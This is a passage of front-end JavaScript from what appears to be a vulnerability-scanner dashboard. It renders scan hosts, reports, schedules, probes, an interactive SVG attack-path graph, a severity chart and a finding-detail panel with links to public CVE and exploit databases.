      <td><code style="font-size:12px">${esc(h.host)}</code></td>
      <td><span class="risk-score risk-${riskToSev(h.risk_score)}">${h.risk_score}</span></td>
      <td><span class="sev sev-${h.max_severity}">${esc(h.max_severity_label)}</span></td>
      <td>${h.finding_count}</td>
      <td style="font-size:12px;color:var(--text-2)">${(h.open_ports||[]).slice(0,8).join(', ')}${h.open_ports?.length>8?' …':''}</td>
      <td style="font-size:12px">${(h.cves||[]).slice(0,3).map(c=>`<code>${esc(c)}</code>`).join(' ')}${h.cves?.length>3?' +'+(h.cves.length-3):''}</td>
      <td>${(h.attack_techniques||[]).slice(0,3).map(t=>`<span class="technique-badge">${esc(t)}</span>`).join(' ')}</td>
    </tr>`).join('');
}

function renderReportsTable(reports) {
  const body = document.getElementById('reportsBody');
  if (!reports.length) { body.innerHTML = '<tr><td colspan="6" class="empty">No reports yet — select a scan and click Generate Report</td></tr>'; return; }
  body.innerHTML = reports.map(r => `
    <tr>
      <td style="font-weight:600">${esc(r.scan_name)}</td>
      <td style="color:var(--text-2)">${fmtDate(r.generated_at)}</td>
      <td>${r.finding_count}</td>
      <td>${r.critical_count > 0 ? `<span class="sev sev-4">${r.critical_count}</span>` : '<span style="color:var(--text-3)">0</span>'}</td>
      <td>${r.has_ai_summary ? '<span class="status status-online">✓ Ready</span>' : '<span style="color:var(--text-3)">—</span>'}</td>
      <td>
        <a class="btn btn-ghost btn-sm" href="${STATE.brainUrl}/api/v1/reports/${r.id}?api_key=${encodeURIComponent(STATE.apiKey)}" target="_blank">↗ Open</a>
        <a class="btn btn-ghost btn-sm" href="${STATE.brainUrl}/api/v1/reports/${r.id}/pdf?api_key=${encodeURIComponent(STATE.apiKey)}" download title="Download PDF report">⬇ PDF</a>
        <button class="btn btn-ghost btn-sm" onclick="emailReport('${r.id}','${esc(r.scan_name)}')" title="Send report by email">✉ Email</button>
        ${!r.has_ai_summary
          ? `<button class="btn btn-ghost btn-sm" onclick="runReportAI('${r.id}')">AI Analyse</button>`
          : `<button class="btn btn-ghost btn-sm" onclick="viewAISummary('${r.id}')">View AI</button>`}
      </td>
    </tr>`).join('');
}

function renderSchedulesTable(schedules) {
  const body = document.getElementById('schedulesBody');
  if (!schedules.length) { body.innerHTML = '<tr><td colspan="6" class="empty">No schedules yet — click "+ New Schedule"</td></tr>'; return; }
  body.innerHTML = schedules.map(s => `
    <tr>
      <td style="font-weight:600">${esc(s.name)}</td>
      <td><code style="font-size:12px">${esc(s.cron_expression)}</code></td>
      <td style="color:var(--text-2)">${s.next_run_at ? fmtDate(s.next_run_at) : '—'}</td>
      <td style="color:var(--text-2)">${s.last_run_at ? fmtDate(s.last_run_at) : '—'}</td>
      <td><span class="status ${s.enabled ? 'status-online' : 'status-offline'}">${s.enabled ? 'Active' : 'Paused'}</span></td>
      <td>
        <button class="btn btn-ghost btn-sm" onclick="runScheduleNow('${s.id}')">▶ Run Now</button>
        <button class="btn btn-ghost btn-sm" onclick="toggleSchedule('${s.id}',${s.enabled})">${s.enabled ? '⏸ Pause' : '▶ Enable'}</button>
        <button class="btn btn-ghost btn-sm" onclick="deleteSchedule('${s.id}')" style="color:var(--critical)">✕</button>
      </td>
    </tr>`).join('');
}

function renderProbesTable(probes) {
  const body = document.getElementById('probesBody');
  if (!probes.length) { body.innerHTML = '<tr><td colspan="5" class="empty">No probes connected</td></tr>'; return; }
  body.innerHTML = probes.map(p => `
    <tr>
      <td><code style="font-size:12px">${esc(p.probe_id)}</code></td>
      <td style="color:var(--text-2)">${esc(p.version || '—')}</td>
      <td style="color:var(--text-2);font-size:13px">${(p.network_context?.subnets || []).join(', ') || '—'}</td>
      <td style="color:var(--text-2)">${fmtDate(p.last_seen)}</td>
      <td><span class="status status-${p.status || 'offline'}">${p.status || 'offline'}</span></td>
    </tr>`).join('');
}

// ── Attack Path Graph ─────────────────────────────────────────

// ═══════════════════════════════════════════════════════
//  Attack Paths — SVG force-directed graph + rich list
// ═══════════════════════════════════════════════════════

const AP = {
  nodes: [], edges: [], paths: [], sim: null,
  transform: { x:0, y:0, k:1 },
  layout: 'force',  // force | radial | grid
  sortBy: 'risk',
  selectedPath: null, selectedNode: null,
  animFrame: null,
};
const AP_SEV_COLOR = { 4:'#f04f59', 3:'#f0853a', 2:'#f0c93a', 1:'#4fc9f0', 0:'#8b90a7' };
const AP_SEV_LABEL = { 4:'Critical', 3:'High', 2:'Medium', 1:'Low', 0:'Info' };
const AP_NODE_R    = { host:18, vuln:14, service:12, default:12 };

async function loadAttackPaths(scanId) {
  if (!scanId) return;
  try {
    const [graphData, paths] = await Promise.all([
      api(`/api/v1/scans/${scanId}/graph`),
      api(`/api/v1/scans/${scanId}/attack-paths`),
    ]);
    AP.nodes = graphData?.nodes || [];
    AP.edges = graphData?.edges || [];
    AP.paths = paths || [];
    AP.selectedPath = null; AP.selectedNode = null;
    apUpdateStats();
    apInitGraph();
    apRenderPathList();
  } catch(e) { console.warn('Attack paths load error:', e); }
}

async function rebuildAttackPaths() {
  const scanId = document.getElementById('apScanFilter').value;
  if (!scanId) return showError('Select a scan first.');
  const btn = document.getElementById('rebuildPathsBtn');
  btn.disabled = true; btn.textContent = '⟳ Rebuilding…';
  try {
    const result = await api(`/api/v1/scans/${scanId}/attack-paths/rebuild`, { method: 'POST' });
    addEvent('path', `Attack paths rebuilt: ${result.attack_paths} path(s) found`);
    await loadAttackPaths(scanId);
  } catch(e) { showError(`Rebuild failed: ${e.message}`); }
  finally { btn.disabled = false; btn.textContent = '⟳ Rebuild'; }
}

function apUpdateStats() {
  const statsBar = document.getElementById('apStatsBar');
  if (!statsBar) return;
  const n = AP.nodes, p = AP.paths;
  if (!n.length && !p.length) { statsBar.style.display='none'; return; }
  statsBar.style.display = 'flex';
  const critNodes = n.filter(nd => (nd.properties?.severity??0) >= 4).length;
  const maxRisk   = p.length ? Math.max(...p.map(x=>x.risk_score||0)).toFixed(1) : '—';
  const entries   = new Set(p.map(x=>x.entry_point).filter(Boolean)).size;
  setText('apStatPathsNum', p.length);
  setText('apStatNodesNum', n.length);
  setText('apStatCritNum',  critNodes);
  setText('apStatMaxRiskNum', maxRisk);
  setText('apStatEntryNum', entries);
}

// ── Layout engines ────────────────────────────────────────────

function apInitGraph() {
  const svg = document.getElementById('apGraphSvg');
  if (!svg) return;
  cancelAnimationFrame(AP.animFrame);

  const W = svg.clientWidth || 700, H = svg.clientHeight || 520;
  AP.transform = { x:0, y:0, k:1 };
  apLayoutNodes(W, H);
  apRenderSvg();
  apSetupInteraction(svg);
}

function apLayoutNodes(W, H) {
  const n = AP.nodes.length;
  if (!n) return;
  const cx = W/2, cy = H/2;

  if (AP.layout === 'radial') {
    // Radial: entry nodes on inner ring, targets on outer
    const pathNodeIds = new Set(AP.paths.flatMap(p=>p.nodes||[]));
    const entries = AP.nodes.filter(nd => AP.paths.some(p=>p.entry_point===nd.id));
    const targets = AP.nodes.filter(nd => AP.paths.some(p=>p.target===nd.id));
    const rest    = AP.nodes.filter(nd => !entries.includes(nd) && !targets.includes(nd));
    const place = (arr, rr) => arr.forEach((nd,i) => {
      const a = (2*Math.PI*i/arr.length) - Math.PI/2;
      nd._x = cx + rr*Math.cos(a); nd._y = cy + rr*Math.sin(a);
    });
    place(entries, Math.min(cx,cy)*0.35);
    place(targets, Math.min(cx,cy)*0.75);
    place(rest,    Math.min(cx,cy)*0.55);

  } else if (AP.layout === 'grid') {
    const cols = Math.ceil(Math.sqrt(n));
    const cellW = (W-80)/cols, cellH = (H-80)/Math.ceil(n/cols);
    AP.nodes.forEach((nd,i) => {
      nd._x = 40 + (i%cols+0.5)*cellW;
      nd._y = 40 + (Math.floor(i/cols)+0.5)*cellH;
    });

  } else {
    // Force-directed simulation (simple spring/repulsion)
    AP.nodes.forEach((nd,i) => {
      if (nd._x===undefined) {
        const a = (2*Math.PI*i/n)-Math.PI/2;
        nd._x = cx + (Math.min(cx,cy)-80)*Math.cos(a);
        nd._y = cy + (Math.min(cx,cy)-80)*Math.sin(a);
      }
      nd._vx = 0; nd._vy = 0;
    });
    apRunForce(W, H, 120);
  }
}

function apRunForce(W, H, iters) {
  const nodes = AP.nodes, edges = AP.edges;
  const idMap  = Object.fromEntries(nodes.map(nd=>[nd.id,nd]));
  const alpha  = 0.3;
  const repel  = 3200, spring = 0.04, ideal = 120;

  for (let it=0; it<iters; it++) {
    const decay = 1 - it/iters;
    // Repulsion
    for (let i=0; i<nodes.length; i++) {
      for (let j=i+1; j<nodes.length; j++) {
        const a=nodes[i], b=nodes[j];
        const dx=b._x-a._x, dy=b._y-a._y;
        const d2=dx*dx+dy*dy+1;
        const f=repel/d2;
        const fx=f*dx/Math.sqrt(d2), fy=f*dy/Math.sqrt(d2);
        a._vx-=fx; a._vy-=fy; b._vx+=fx; b._vy+=fy;
      }
    }
    // Attraction (edges)
    edges.forEach(e => {
      const a=idMap[e.source], b=idMap[e.target];
      if (!a||!b) return;
      const dx=b._x-a._x, dy=b._y-a._y;
      const d=Math.sqrt(dx*dx+dy*dy)||1;
      const f=spring*(d-ideal);
      const fx=f*dx/d, fy=f*dy/d;
      a._vx+=fx; a._vy+=fy; b._vx-=fx; b._vy-=fy;
    });
    // Centre gravity
    nodes.forEach(nd => {
      nd._vx += (W/2-nd._x)*0.01;
      nd._vy += (H/2-nd._y)*0.01;
    });
    // Integrate
    nodes.forEach(nd => {
      nd._x += nd._vx*alpha*decay;
      nd._y += nd._vy*alpha*decay;
      nd._x = Math.max(30, Math.min(W-30, nd._x));
      nd._y = Math.max(30, Math.min(H-30, nd._y));
      nd._vx *= 0.7; nd._vy *= 0.7;
    });
  }
}

function apRenderSvg() {
  const svg = document.getElementById('apGraphSvg');
  if (!svg) return;
  const W = svg.clientWidth||700, H = svg.clientHeight||520;
  const { x, y, k } = AP.transform;

  // Build path node sets for highlighting
  const pathNodes = AP.selectedPath
    ? new Set(AP.selectedPath.nodes||[])
    : null;
  const pathEdges = AP.selectedPath
    ? new Set((AP.selectedPath.nodes||[]).flatMap((n,i,arr) =>
        i<arr.length-1 ? [`${arr[i]}→${arr[i+1]}`] : []))
    : null;

  const edgeHtml = AP.edges.map(e => {
    const a = AP.nodes.find(n=>n.id===e.source);
    const b = AP.nodes.find(n=>n.id===e.target);
    if (!a||!b) return '';
    const key = `${e.source}→${e.target}`;
    const isPath = pathEdges ? pathEdges.has(key) : false;
    const dimmed = pathEdges && !isPath;
    const col = isPath ? '#7c6af7' : 'rgba(124,106,247,0.25)';
    const w   = isPath ? 2.5 : 1.2;

    // Arrow
    const dx=b._x-a._x, dy=b._y-a._y, d=Math.sqrt(dx*dx+dy*dy)||1;
    const tr = AP_NODE_R[b.node_type]||12;
    const tx=b._x-dx/d*tr, ty=b._y-dy/d*tr;
    const ax=Math.atan2(dy,dx);
    const arr1x=tx-10*Math.cos(ax-.4), arr1y=ty-10*Math.sin(ax-.4);
    const arr2x=tx-10*Math.cos(ax+.4), arr2y=ty-10*Math.sin(ax+.4);

    return `<g class="ap-edge${dimmed?' dimmed':''}">
      <line x1="${a._x}" y1="${a._y}" x2="${tx}" y2="${ty}"
            stroke="${col}" stroke-width="${w}" stroke-linecap="round"/>
      <polygon points="${tx},${ty} ${arr1x},${arr1y} ${arr2x},${arr2y}"
               fill="${col}" opacity="${isPath?0.9:0.5}"/>
    </g>`;
  }).join('');

  const nodeHtml = AP.nodes.map(nd => {
    const sev   = nd.properties?.severity ?? 0;
    const color = AP_SEV_COLOR[sev] || '#8b90a7';
    const r     = AP_NODE_R[nd.node_type] || 12;
    const label = (nd.identifier||nd.id).replace(/^(host:|vuln:|service:)/,'').slice(0,14);
    const inPath   = pathNodes ? pathNodes.has(nd.id) : false;
    const isEntry  = AP.paths.some(p=>p.entry_point===nd.id);
    const isTarget = AP.paths.some(p=>p.target===nd.id);
    const dimmed   = pathNodes && !inPath;
    const selected = AP.selectedNode?.id === nd.id;

    const icon = isEntry ? '⮕' : isTarget ? '⚑' : nd.node_type==='vuln' ? '!' : '';

    return `<g class="ap-node${dimmed?' dimmed':''}${selected?' selected':''}"
              data-id="${nd.id}"
              transform="translate(${nd._x},${nd._y})"
              onclick="apSelectNode('${nd.id}')"
              onmouseenter="apShowTooltip(event,'${nd.id}')"
              onmouseleave="apHideTooltip()">
      <!-- glow -->
      <circle r="${r+10}" fill="${color}" opacity="${inPath?0.18:0.07}"/>
      <!-- ring (entry/target markers) -->
      ${isEntry  ? `<circle r="${r+5}" fill="none" stroke="#4cf098" stroke-width="1.5" stroke-dasharray="4,3" opacity="0.8"/>` : ''}
      ${isTarget ? `<circle r="${r+5}" fill="none" stroke="#f04f59" stroke-width="1.5" stroke-dasharray="4,3" opacity="0.8"/>` : ''}
      <!-- body -->
      <circle r="${r}" fill="${color}22" stroke="${color}" stroke-width="${selected?3:1.8}"/>
      <!-- icon -->
      ${icon ? `<text text-anchor="middle" dominant-baseline="central" font-size="10" fill="${color}" font-weight="bold">${icon}</text>` : ''}
      <!-- label -->
      <text y="${r+14}" text-anchor="middle" font-size="9.5" fill="rgba(221,225,240,0.75)"
            font-family="Inter,system-ui">${label}</text>
    </g>`;
  }).join('');

  svg.innerHTML = `
    <defs>
      <filter id="apGlow" x="-50%" y="-50%" width="200%" height="200%">
        <feGaussianBlur stdDeviation="3" result="blur"/>
        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
      </filter>
    </defs>
    ${!AP.nodes.length ? `<text x="${W/2}" y="${H/2}" text-anchor="middle" fill="rgba(139,144,167,.5)" font-size="13" font-family="Inter,system-ui">No graph data — select a scan or rebuild paths</text>` : ''}
    <g id="apGraphGroup" transform="translate(${x},${y}) scale(${k})">
      ${edgeHtml}
      ${nodeHtml}
    </g>`;
}

function apSetupInteraction(svg) {
  let drag = null, panStart = null;

  svg.addEventListener('mousedown', e => {
    if (e.target.closest('.ap-node')) return;
    panStart = { x: e.clientX - AP.transform.x, y: e.clientY - AP.transform.y };
    svg.classList.add('dragging');
  });
  window.addEventListener('mousemove', e => {
    if (!panStart) return;
    AP.transform.x = e.clientX - panStart.x;
    AP.transform.y = e.clientY - panStart.y;
    const g = document.getElementById('apGraphGroup');
    if (g) g.setAttribute('transform',`translate(${AP.transform.x},${AP.transform.y}) scale(${AP.transform.k})`);
  });
  window.addEventListener('mouseup', () => { panStart=null; svg.classList.remove('dragging'); });

  svg.addEventListener('wheel', e => {
    e.preventDefault();
    const factor = e.deltaY < 0 ? 1.12 : 0.89;
    const rect = svg.getBoundingClientRect();
    const mx = e.clientX - rect.left, my = e.clientY - rect.top;
    AP.transform.k = Math.max(0.3, Math.min(4, AP.transform.k * factor));
    AP.transform.x = mx - (mx - AP.transform.x)*factor;
    AP.transform.y = my - (my - AP.transform.y)*factor;
    const g = document.getElementById('apGraphGroup');
    if (g) g.setAttribute('transform',`translate(${AP.transform.x},${AP.transform.y}) scale(${AP.transform.k})`);
  }, { passive:false });
}

function apZoom(factor) {
  const svg = document.getElementById('apGraphSvg');
  if (!svg) return;
  const W=svg.clientWidth/2, H=svg.clientHeight/2;
  AP.transform.k = Math.max(0.3, Math.min(4, AP.transform.k * factor));
  AP.transform.x = W - (W - AP.transform.x)*factor;
  AP.transform.y = H - (H - AP.transform.y)*factor;
  const g = document.getElementById('apGraphGroup');
  if (g) g.setAttribute('transform',`translate(${AP.transform.x},${AP.transform.y}) scale(${AP.transform.k})`);
}

function apFitGraph() {
  const svg = document.getElementById('apGraphSvg');
  if (!svg || !AP.nodes.length) return;
  const W=svg.clientWidth||700, H=svg.clientHeight||520;
  const xs=AP.nodes.map(n=>n._x), ys=AP.nodes.map(n=>n._y);
  const minX=Math.min(...xs), maxX=Math.max(...xs);
  const minY=Math.min(...ys), maxY=Math.max(...ys);
  const gW=maxX-minX||1, gH=maxY-minY||1;
  AP.transform.k = Math.min(0.9, (W-80)/gW, (H-80)/gH);
  AP.transform.x = (W-(minX+maxX)*AP.transform.k)/2;
  AP.transform.y = (H-(minY+maxY)*AP.transform.k)/2;
  const g = document.getElementById('apGraphGroup');
  if (g) g.setAttribute('transform',`translate(${AP.transform.x},${AP.transform.y}) scale(${AP.transform.k})`);
}

const AP_LAYOUTS = ['force','radial','grid'];
function apCycleLayout() {
  const cur = AP_LAYOUTS.indexOf(AP.layout);
  AP.layout = AP_LAYOUTS[(cur+1) % AP_LAYOUTS.length];
  setText('apLayoutLabel', AP.layout[0].toUpperCase()+AP.layout.slice(1));
  const svg = document.getElementById('apGraphSvg');
  if (svg) apLayoutNodes(svg.clientWidth||700, svg.clientHeight||520);
  apRenderSvg();
}

function apSelectNode(nodeId) {
  const nd = AP.nodes.find(n=>n.id===nodeId);
  if (!nd) return;
  AP.selectedNode = nd === AP.selectedNode ? null : nd;
  // find paths through this node
  const throughPaths = AP.paths.filter(p=>(p.nodes||[]).includes(nodeId));
  if (throughPaths.length === 1) apSelectPath(throughPaths[0]);
  else if (throughPaths.length > 1) apShowNodeDetail(nd, throughPaths);
  else apShowNodeDetail(nd, []);
  apRenderSvg();
}

function apShowNodeDetail(nd, throughPaths) {
  const sev = nd.properties?.severity ?? 0;
  const badge = document.getElementById('apDetailBadge');
  if (badge) {
    badge.style.display='';
    badge.className=`sev sev-${sev}`;
    badge.textContent = AP_SEV_LABEL[sev]||'Info';
  }
  const label = (nd.identifier||nd.id).replace(/^(host:|vuln:|service:)/,'');
  const isEntry  = AP.paths.some(p=>p.entry_point===nd.id);
  const isTarget = AP.paths.some(p=>p.target===nd.id);
  document.getElementById('apPathDetail').innerHTML = `
    <div class="ap-detail-row">
      <div class="ap-detail-col">
        <div class="ap-detail-label">Identifier</div>
        <div class="ap-detail-val" style="font-family:monospace;font-size:12px">${esc(label)}</div>
      </div>
      <div class="ap-detail-col">
        <div class="ap-detail-label">Type</div>
        <div class="ap-detail-val">${nd.node_type||'node'}</div>
      </div>
    </div>
    <div class="ap-detail-row">
      <div class="ap-detail-col">
        <div class="ap-detail-label">Role</div>
        <div class="ap-detail-val" style="color:${isEntry?'#4cf098':isTarget?'#f04f59':'#8b90a7'}">${isEntry?'Entry Point':isTarget?'Target':'Intermediate'}</div>
      </div>
      <div class="ap-detail-col">
        <div class="ap-detail-label">Paths Through</div>
        <div class="ap-detail-val">${throughPaths.length}</div>
      </div>
    </div>
    ${nd.properties?.service||nd.properties?.port ? `
    <div class="ap-detail-row" style="gap:8px;flex-wrap:wrap;margin-bottom:0">
      ${nd.properties?.port ? `<span class="ap-chain-node">port:${nd.properties.port}</span>` : ''}
      ${nd.properties?.service ? `<span class="ap-chain-node">${nd.properties.service}</span>` : ''}
      ${nd.properties?.protocol ? `<span class="ap-chain-node">${nd.properties.protocol}</span>` : ''}
    </div>` : ''}`;
}

function apSelectPath(path) {
  AP.selectedPath = path === AP.selectedPath ? null : path;
  document.querySelectorAll('.path-item').forEach(el => {
    el.classList.toggle('active', el.dataset.pathId === path?.id);
  });
  if (!AP.selectedPath) {
    const badge = document.getElementById('apDetailBadge');
    if (badge) badge.style.display='none';
    setText('apPathDetail', 'Click a path or graph node to inspect it');
    apRenderSvg(); return;
  }
  // Update detail panel
  const p = path;
  const sev = riskToSev(p.risk_score);
  const badge = document.getElementById('apDetailBadge');
  if (badge) { badge.style.display=''; badge.className=`sev sev-${sev}`; badge.textContent=`Risk ${(p.risk_score||0).toFixed(1)}`; }

  const entry  = (p.entry_point||'').replace(/^(host:|vuln:)/,'');
  const target = (p.target||'').replace(/^(host:|vuln:)/,'');
  const hops   = (p.nodes||[]).length;

  const chainHtml = (p.nodes||[]).map((n,i,arr) => {
    const nd = AP.nodes.find(x=>x.id===n);
    const label = (nd?.identifier||n).replace(/^(host:|vuln:|service:)/,'').slice(0,20);
    const col   = i===0?'#4cf098':i===arr.length-1?'#f04f59':'#b0b5c9';
    return `<span class="ap-chain-node" style="color:${col}">${esc(label)}</span>${i<arr.length-1?'<span class="ap-chain-arrow"> → </span>':''}`;
  }).join('');

  document.getElementById('apPathDetail').innerHTML = `
    <div class="ap-detail-row">
      <div class="ap-detail-col">
        <div class="ap-detail-label">Entry Point</div>
        <div class="ap-detail-val" style="color:#4cf098;font-family:monospace;font-size:12px">${esc(entry)||'—'}</div>
      </div>
      <div class="ap-detail-col">
        <div class="ap-detail-label">Target</div>
        <div class="ap-detail-val" style="color:#f04f59;font-family:monospace;font-size:12px">${esc(target)||'—'}</div>
      </div>
    </div>
    <div class="ap-detail-row">
      <div class="ap-detail-col">
        <div class="ap-detail-label">Hops</div>
        <div class="ap-detail-val">${hops}</div>
      </div>
      <div class="ap-detail-col">
        <div class="ap-detail-label">Impact</div>
        <div class="ap-detail-val" style="font-size:11px;font-weight:400;color:#b0b5c9">${esc((p.impact||'').slice(0,60))||'—'}</div>
      </div>
    </div>
    <div style="margin-top:4px">
      <div class="ap-detail-label" style="margin-bottom:6px">Exploitation Chain</div>
      <div style="display:flex;flex-wrap:wrap;gap:4px;align-items:center">${chainHtml}</div>
    </div>`;
  apRenderSvg();
}

function apSelectPathById(pathId) {
  const path = AP.paths.find(p => p.id === pathId);
  if (path) apSelectPath(path);
}

function apSortPaths(by) {
  AP.sortBy = by;
  document.getElementById('apSortRisk').style.opacity = by==='risk'?'1':'0.5';
  document.getElementById('apSortHops').style.opacity = by==='hops'?'1':'0.5';
  apRenderPathList();
}

function apRenderPathList() {
  const container = document.getElementById('attackPathsList');
  if (!container) return;
  if (!AP.paths.length) {
    container.innerHTML = '<div class="empty" style="padding:32px;text-align:center">No attack paths found.<br><span style="font-size:12px;color:#555">Click Rebuild to compute paths.</span></div>';
    return;
  }
  const sorted = [...AP.paths].sort((a,b) =>
    AP.sortBy==='hops'
      ? (a.nodes?.length||0)-(b.nodes?.length||0)
      : (b.risk_score||0)-(a.risk_score||0)
  );
  container.innerHTML = sorted.map(p => {
    const entry  = (p.entry_point||'').replace(/^(host:|vuln:)/,'').slice(0,18);
    const target = (p.target||'').replace(/^(host:|vuln:)/,'').slice(0,18);
    const sev    = riskToSev(p.risk_score);
    const hops   = (p.nodes||[]).length;
    return `<div class="path-item" data-path-id="${p.id}" onclick="apSelectPathById('${p.id}')">
      <div class="path-header">
        <div class="path-route">
          <span class="path-route-entry">${esc(entry)||'?'}</span>
          <span class="path-route-arrow">⟶</span>
          <span class="path-route-target">${esc(target)||'?'}</span>
        </div>
        <div style="display:flex;align-items:center;gap:6px;flex-shrink:0">
          <span style="font-size:10px;color:#6b7599">${hops} hop${hops!==1?'s':''}</span>
          <span class="sev sev-${sev}">Risk ${(p.risk_score||0).toFixed(1)}</span>
        </div>
      </div>
    </div>`;
  }).join('');
}

function apShowTooltip(e, nodeId) {
  const nd = AP.nodes.find(n=>n.id===nodeId);
  if (!nd) return;
  const tt = document.getElementById('apTooltip');
  if (!tt) return;
  const sev   = nd.properties?.severity ?? 0;
  const color = AP_SEV_COLOR[sev];
  const label = (nd.identifier||nd.id).replace(/^(host:|vuln:|service:)/,'');
  const throughCount = AP.paths.filter(p=>(p.nodes||[]).includes(nodeId)).length;
  const isEntry  = AP.paths.some(p=>p.entry_point===nd.id);
  const isTarget = AP.paths.some(p=>p.target===nd.id);
  tt.innerHTML = `
    <div style="font-size:12px;font-weight:600;color:#dde1f0;margin-bottom:6px">${esc(label)}</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px">
      <span style="font-size:11px;color:${color}">${AP_SEV_LABEL[sev]}</span>
      <span style="font-size:11px;color:#6b7599">${nd.node_type||'node'}</span>
      ${isEntry  ? '<span style="font-size:11px;color:#4cf098">Entry Point</span>' : ''}
      ${isTarget ? '<span style="font-size:11px;color:#f04f59">Target</span>' : ''}
    </div>
    ${nd.properties?.port  ? `<div style="font-size:11px;color:#8b90a7">Port: ${nd.properties.port}</div>` : ''}
    ${nd.properties?.service ? `<div style="font-size:11px;color:#8b90a7">Service: ${nd.properties.service}</div>` : ''}
    <div style="font-size:11px;color:#6b7599;margin-top:4px">${throughCount} path${throughCount!==1?'s':''} through this node</div>`;

  const rect = document.getElementById('apGraphSvg').getBoundingClientRect();
  const svgRect = document.getElementById('apGraphSvg').getBoundingClientRect();
  const mx = e.clientX - svgRect.left, my = e.clientY - svgRect.top;
  tt.style.left = Math.min(mx + 14, (svgRect.width - 200)) + 'px';
  tt.style.top  = Math.max(my - 60, 10) + 'px';
  tt.style.display = 'block';
}

function apHideTooltip() {
  const tt = document.getElementById('apTooltip');
  if (tt) tt.style.display='none';
}

// drawGraph kept for backward compatibility (topology page uses it via canvas)
function drawGraph(data) { /* replaced by SVG system above */ }

function renderPathList(paths) { AP.paths=paths||[]; apRenderPathList(); }

// ── Legacy canvas graph alias (used by topology) ──────────────



// ── Severity Chart ────────────────────────────────────────────

function drawSeverityChartFromStats(bySeverity) {
  const canvas = document.getElementById('severityChart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const labels = ['Info','Low','Med','High','Crit'];
  const colors = ['#6b7599','#4fc9f0','#f0c93a','#f0853a','#f04f59'];
  const counts = [
    bySeverity.Info     ?? 0,
    bySeverity.Low      ?? 0,
    bySeverity.Medium   ?? 0,
    bySeverity.High     ?? 0,
    bySeverity.Critical ?? 0,
  ];
  const max   = Math.max(...counts, 1);
  const W     = canvas.width;
  const H     = canvas.height;
  const barW  = 32, gap = 16, startX = 20, baseY = H - 28;

  ctx.clearRect(0, 0, W, H);

  counts.forEach((count, i) => {
    const x    = startX + i * (barW + gap);
    const barH = Math.max(2, (count / max) * (baseY - 20));

    // Bar glow
    const grd = ctx.createLinearGradient(x, baseY - barH, x, baseY);
    grd.addColorStop(0, colors[i]);
    grd.addColorStop(1, colors[i] + '33');

    ctx.beginPath();
    ctx.roundRect(x, baseY - barH, barW, barH, 4);
    ctx.fillStyle = colors[i] + '22';
    ctx.fill();
    ctx.strokeStyle = colors[i];
    ctx.lineWidth = 1.5;
    ctx.stroke();

    ctx.fillStyle = colors[i];
    ctx.font = 'bold 12px Inter, system-ui';
    ctx.textAlign = 'center';
    if (count > 0) ctx.fillText(count, x + barW / 2, baseY - barH - 6);

    ctx.fillStyle = 'rgba(155,163,196,0.6)';
    ctx.font = '10px Inter, system-ui';
    ctx.fillText(labels[i], x + barW / 2, baseY + 14);
  });
}

// ── Finding Modal ─────────────────────────────────────────────

function showFinding(f) {
  const compTags = getComplianceTags(f);
  const compHTML = compTags.length ? `
    <div class="detail-row"><span class="detail-label">Compliance</span><span class="detail-value">
      <div class="compliance-tags">${compTags.map(t=>`<span class="compliance-tag"><span class="std">${esc(t.std)}</span> ${esc(t.ref)} — ${esc(t.name)}</span>`).join('')}</div>
    </span></div>` : '';

  const resourceHTML = f.cve_id ? `
    <div class="detail-row"><span class="detail-label">Resources</span><span class="detail-value">
      <div class="resource-links">
        <a href="https://nvd.nist.gov/vuln/detail/${esc(f.cve_id)}" target="_blank" class="resource-link">NVD</a>
        <a href="https://www.exploit-db.com/search?cve=${esc(f.cve_id)}" target="_blank" class="resource-link">Exploit-DB</a>
        <a href="https://github.com/search?q=${esc(f.cve_id)}&type=repositories" target="_blank" class="resource-link">GitHub PoCs</a>
        <a href="https://www.shodan.io/search?query=vuln:${esc(f.cve_id)}" target="_blank" class="resource-link">Shodan</a>
        <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=${esc(f.cve_id)}" target="_blank" class="resource-link">MITRE</a>
      </div>
    </span></div>` : '';

  document.getElementById('findingDetail').innerHTML = `
    <div class="finding-detail-grid">
      <div class="detail-row"><span class="detail-label">Severity</span><span class="detail-value"><span class="sev sev-${f.severity}">${sevLabel(f.severity)}</span></span></div>
      <div class="detail-row"><span class="detail-label">Host</span><span class="detail-value"><code>${esc(f.host)}</code></span></div>
      <div class="detail-row"><span class="detail-label">Port / Service</span><span class="detail-value">${f.port || '—'}${f.service ? ' / ' + esc(f.service) : ''}</span></div>
      <div class="detail-row"><span class="detail-label">Title</span><span class="detail-value" style="font-weight:600">${esc(f.title)}</span></div>
      <div class="detail-row"><span class="detail-label">CVE</span><span class="detail-value">${f.cve_id ? `<a href="https://nvd.nist.gov/vuln/detail/${esc(f.cve_id)}" target="_blank" class="cve-link">${esc(f.cve_id)}</a>` : '—'}</span></div>
      ${f.cvss_score != null ? `<div class="detail-row"><span class="detail-label">CVSS</span><span class="detail-value"><span class="cvss-score cvss-${cvssColor(f.cvss_score)}">${f.cvss_score} ${f.cvss_severity || ''}</span></span></div>` : ''}
      ${f.attack_techniques?.length ? `<div class="detail-row"><span class="detail-label">ATT&CK</span><span class="detail-value">${f.attack_techniques.map(t=>`<a href="https://attack.mitre.org/techniques/${esc(t.split('.')[0])}/" target="_blank" class="technique-badge">${esc(t)}</a>`).join(' ')}</span></div>` : ''}
      ${compHTML}
      <div class="detail-row"><span class="detail-label">Description</span><span class="detail-value" style="color:var(--text-2)">${esc(f.description || '—')}</span></div>
      <div class="detail-row"><span class="detail-label">Evidence</span><span class="detail-value"><div class="detail-evidence">${esc(f.evidence || '—')}</div></span></div>
      <div class="detail-row"><span class="detail-label">Remediation</span><span class="detail-value" style="color:var(--text-2)">${esc(f.remediation || '—')}</span></div>
      ${resourceHTML}
      ${f.suppressed ? '<div class="detail-row"><span class="detail-label">Suppressed</span><span class="detail-value"><span class="status status-offline">Yes — False Positive</span></span></div>' : ''}
      <div class="detail-row"><span class="detail-label">Remediation Status</span><span class="detail-value">
        <select id="findingRemStatus" class="rstat-select rstat-select-${f.remediation_status||'new'}" onchange="document.getElementById('findingRemStatus').className='rstat-select rstat-select-'+this.value">
          <option value="new"            ${(f.remediation_status||'new')==='new'?'selected':''}>New</option>
          <option value="in_progress"    ${f.remediation_status==='in_progress'?'selected':''}>In Progress</option>
          <option value="fixed"          ${f.remediation_status==='fixed'?'selected':''}>Fixed</option>
